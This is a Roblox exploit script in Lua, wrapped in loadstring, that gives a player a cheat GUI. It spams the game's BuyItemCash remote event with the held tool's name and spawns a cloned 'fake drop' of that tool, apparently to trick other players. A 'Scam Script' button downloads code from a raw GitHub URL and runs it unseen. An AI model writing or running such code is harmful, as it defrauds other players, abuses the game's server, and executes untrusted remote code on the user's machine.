-- Script Made 100% by Aserial protected by Rigths.
-- Don’t change it or you Will pay the consequences ...
-- AserialDev 2025.

loadstring([[
local player = game:GetService("Players").LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local remote = replicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("BuyItemCash")
local runService = game:GetService("RunService")

-- UI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "AserialItemBuyer"

-- Bulle flottante cachée au début
local bubble = Instance.new("TextButton", gui)
bubble.Visible = false
bubble.Size = UDim2.new(0, 120, 0, 30)
bubble.Position = UDim2.new(0, 20, 1, -60)
bubble.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
bubble.Text = "Aserial Script"
bubble.TextColor3 = Color3.new(1, 1, 1)
bubble.Font = Enum.Font.GothamBold
bubble.TextSize = 14
bubble.BorderSizePixel = 0

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 270, 0, 240)
frame.Position = UDim2.new(0.5, -135, 0.5, -120)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

-- Boutons style Windows
local closeBtn = Instance.new("TextButton", frame)
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -30, 0, 0)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 14
closeBtn.BorderSizePixel = 0

local minimizeBtn = Instance.new("TextButton", frame)
minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
minimizeBtn.Position = UDim2.new(1, -60, 0, 0)
minimizeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
minimizeBtn.Text = "-"
minimizeBtn.TextColor3 = Color3.new(1, 1, 1)
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.TextSize = 14
minimizeBtn.BorderSizePixel = 0

-- Titre
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -60, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
title.Text = "PPT Script by Aserial"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.BorderSizePixel = 0
title.Position = UDim2.new(0, 0, 0, 0)

-- Boutons
local buyBtn = Instance.new("TextButton", frame)
buyBtn.Position = UDim2.new(0.1, 0, 0.25, 0)
buyBtn.Size = UDim2.new(0.8, 0, 0, 30)
buyBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
buyBtn.TextColor3 = Color3.new(1, 1, 1)
buyBtn.Font = Enum.Font.GothamBold
buyBtn.TextSize = 14
buyBtn.BorderSizePixel = 0

local dropBtn = Instance.new("TextButton", frame)
dropBtn.Position = UDim2.new(0.1, 0, 0.45, 0)
dropBtn.Size = UDim2.new(0.8, 0, 0, 30)
dropBtn.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
dropBtn.TextColor3 = Color3.new(1, 1, 1)
dropBtn.Font = Enum.Font.GothamBold
dropBtn.TextSize = 14
dropBtn.BorderSizePixel = 0

local scamBtn = Instance.new("TextButton", frame)
scamBtn.Position = UDim2.new(0.1, 0, 0.65, 0)
scamBtn.Size = UDim2.new(0.8, 0, 0, 30)
scamBtn.BackgroundColor3 = Color3.fromRGB(120, 60, 200)
scamBtn.TextColor3 = Color3.new(1, 1, 1)
scamBtn.Font = Enum.Font.GothamBold
scamBtn.TextSize = 14
scamBtn.BorderSizePixel = 0
scamBtn.Text = "Scam Script"

local itemNameLabel = Instance.new("TextLabel", frame)
itemNameLabel.Position = UDim2.new(0.1, 0, 0.86, 0)
itemNameLabel.Size = UDim2.new(0.8, 0, 0, 20)
itemNameLabel.BackgroundTransparency = 1
itemNameLabel.TextColor3 = Color3.new(1, 1, 1)
itemNameLabel.Font = Enum.Font.Gotham
itemNameLabel.TextSize = 14
itemNameLabel.Text = "Object : Nothing"

-- Lien Discord violet
local discordLabel = Instance.new("TextLabel", frame)
discordLabel.Size = UDim2.new(1, 0, 0, 20)
discordLabel.Position = UDim2.new(0, 0, 1, -20)
discordLabel.BackgroundTransparency = 1
discordLabel.Text = "discord.gg/y9FC7xPrvU"
discordLabel.TextColor3 = Color3.fromRGB(180, 80, 255)
discordLabel.Font = Enum.Font.Gotham
discordLabel.TextSize = 13

-- Achat toggle
local buying = false
local function toggleBuying()
    buying = not buying
    if buying then
        buyBtn.BackgroundColor3 = Color3.fromRGB(50, 180, 75)
        task.spawn(function()
            while buying do
                local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
                if tool then
                    remote:FireServer(tool.Name)
                end
                task.wait(0.1)
            end
        end)
    else
        buyBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
    end
end

-- Fake drop réaliste
local function fakeDropRealistic()
    local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
    if tool and tool:FindFirstChild("Handle") then
        local clone = tool:Clone()
        clone.Parent = workspace
        local handle = clone:FindFirstChild("Handle")
        if not handle then return end

        local hrp = player.Character:FindFirstChild("HumanoidRootPart")
        local dropPos = (hrp.CFrame * CFrame.new(0, -2.5, -4)).Position

        handle.Anchored = true
        handle.CFrame = CFrame.new(dropPos + Vector3.new(0, 1, 0)) * CFrame.Angles(0, math.rad(math.random(0,360)), 0)
        handle.CanCollide = true
    end
end

-- Scam script
local function runScamScript()
    local url = "https://raw.githubusercontent.com/Rheingold59/Pop-it-trading/refs/heads/main/Scam.md"
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    if success then
        loadstring(result)()
    else
        warn("Erreur chargement scam script :", result)
    end
end

-- Fermer / Réduire
closeBtn.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

minimizeBtn.MouseButton1Click:Connect(function()
    frame.Visible = false
    bubble.Visible = true
end)

bubble.MouseButton1Click:Connect(function()
    frame.Visible = true
    bubble.Visible = false
end)

-- UI dynamique
runService.RenderStepped:Connect(function()
    local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
    local toolName = tool and tool.Name or "Nothing"
    itemNameLabel.Text = "Object took : " .. toolName
    buyBtn.Text = "Buy : " .. toolName
    dropBtn.Text = "Fake Drop : " .. toolName
end)

-- Boutons
buyBtn.MouseButton1Click:Connect(toggleBuying)
dropBtn.MouseButton1Click:Connect(fakeDropRealistic)
scamBtn.MouseButton1Click:Connect(runScamScript)
]])()
